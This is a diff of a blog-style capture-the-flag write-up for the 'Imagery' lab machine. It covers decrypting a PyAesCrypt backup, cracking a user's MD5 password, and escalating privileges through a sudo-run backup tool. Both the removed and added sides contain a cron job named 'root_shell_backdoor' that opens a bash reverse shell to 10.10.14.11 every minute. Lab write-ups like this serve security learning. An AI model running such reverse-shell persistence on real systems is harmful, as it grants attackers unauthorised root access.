-I run the command <code>auto add --schedule "* * * * *" --command "bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.11/8888 0&gt;&amp;1'" --name "root_shell_backdoor"</code>,
-<p><code>--schedule "* * * * *"</code> This means my command runs every minute.</p>
-<p><code>bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.11/8888 0&gt;&amp;1'</code> opens a bash revshell that redirects input/output/error to my laptop.</p>
-<p><img alt="" src="../writeups/Imagery_writeup/root.png" />
-I launch a netcat command and after a few seconds of waiting, I get my revshell and the root flag.</p>
-<h1>GG</h1>
-                </section>
-            </div>
+</code></pre>
+          </div>
+          <p>In parallel, we launch our netcat</p>
+          <p><img alt="" src="../writeups/Imagery_writeup/revshell.png" />
+            I finally have my revshell; now I need Mark's SSH password. During my research, I noticed that the SSH
+            connection for the user Mark uses a public key. Therefore, I will need to find Mark's password and connect
+            from my revshell.</p>
+          <p><img alt="" src="../writeups/Imagery_writeup/ssh.png" /></p>
+          <h2>Backup decryption</h2>
+          <p>I started by launching linepeas on the revshell, and there I noticed a backup file in
+            /var/backup/web_20250806_120723.zip.aes, It is zipped and encrypted with AES.
+            <img alt="" src="../writeups/Imagery_writeup/linepeas.png" />
+            <img alt="" src="../writeups/Imagery_writeup/web_zip_aes.png" />
+          </p>
+          <p>A little further on I see that a user used PyAesCrypt to encrypt the backup file.
+            <img alt="" src="../writeups/Imagery_writeup/pyaescrypt.png" />
+          </p>
+          <p>I extract the backup to my laptop and decrypt it with a Python script found on GitHub:
+            https://github.com/Nabeelcn25/dpyAesCrypt.py
+            <img alt="" src="../writeups/Imagery_writeup/dechiffrement.png" />
+          </p>
+          <p>In the unzipped backup there is a db.json file, inside which is the password of mark
+            <img alt="" src="../writeups/Imagery_writeup/db.png" />
+          </p>
+          <p>Using md5 decryption, we can find the real password for mark:supersmash, I log into Mark's account and
+            retrieve the user flag.
+            <img alt="" src="../writeups/Imagery_writeup/su_mark.png" />
+            <img alt="" src="../writeups/Imagery_writeup/user.png" />
+          </p>
+          <h2>Privilege escalation</h2>
+          <p>with a simple sudo -l I see that we can run charcol as sudo without needing the password; that's probably
+            where we'll be able to do our privilege escalation.
+            <img alt="" src="../writeups/Imagery_writeup/sudo_l.png" />
+          </p>
+          <p><img alt="" src="../writeups/Imagery_writeup/sudoL.png" /></p>
+          <p>When I launch Charcol, I realize it's a backup tool. I notice there's user documentation available.
+            <img alt="" src="../writeups/Imagery_writeup/help.png" />
+            The help reveals that I can reset charcol's password with mark's password
+          </p>
+          <p>I reset the password and launched the charcol shell
+            <img alt="" src="../writeups/Imagery_writeup/reset.png" />
+          </p>
+          <p>I consult the shell help documentation
+            <img alt="" src="../writeups/Imagery_writeup/aide.png" />
+            Help shows all commands available in the shell. I noticed that you can add tasks to cron as root (because
+            you're using sudo) to automate tasks. However, in my case, I can use it to force the root account to open a
+            TCP connection to a netcat instance that I've launched locally, because thanks to <code>--command</code> I
+            can enter bash commands. In short, I can have a <strong>root revshell</strong>.
+          </p>
+          <p><img alt="" src="../writeups/Imagery_writeup/command.png" />
+            I run the command
+            <code>auto add --schedule "* * * * *" --command "bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.11/8888 0&gt;&amp;1'" --name "root_shell_backdoor"</code>,
+          <p><code>--schedule "* * * * *"</code> This means my command runs every minute.</p>
+          <p><code>bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.11/8888 0&gt;&amp;1'</code> opens a bash revshell that
+            redirects input/output/error to my laptop.</p>
+          <p><img alt="" src="../writeups/Imagery_writeup/root.png" />
+            I launch a netcat command and after a few seconds of waiting, I get my revshell and the root flag.</p>
+          <h1>GG</h1>
+        </section>
+      </div>
 
-            <footer class="post-footer">
-                <a href="../pages/writeups.html" class="back-link">&larr; Back to writeups</a>
-            </footer>
-        </div>
-    </article>
+      <footer class="post-footer">
+        <a href="../pages/writeups.html" class="back-link">&larr; Back to writeups</a>
+      </footer>
+    </div>
+  </article>
 
-    <footer class="footer">
-        <div class="container">
-            <p>&copy; 2026 Shaadi · 1wnl means I will never lose</p>
-        </div>
-    </footer>
+  <footer class="footer">
+    <div class="container">
+      <p>&copy; 2026 Shaadi · 1wnl means I will never lose</p>
+    </div>
+  </footer>
 
-    <script src="../script.js"></script>
+  <script src="../script.js"></script>
 </body>
+
 </html>
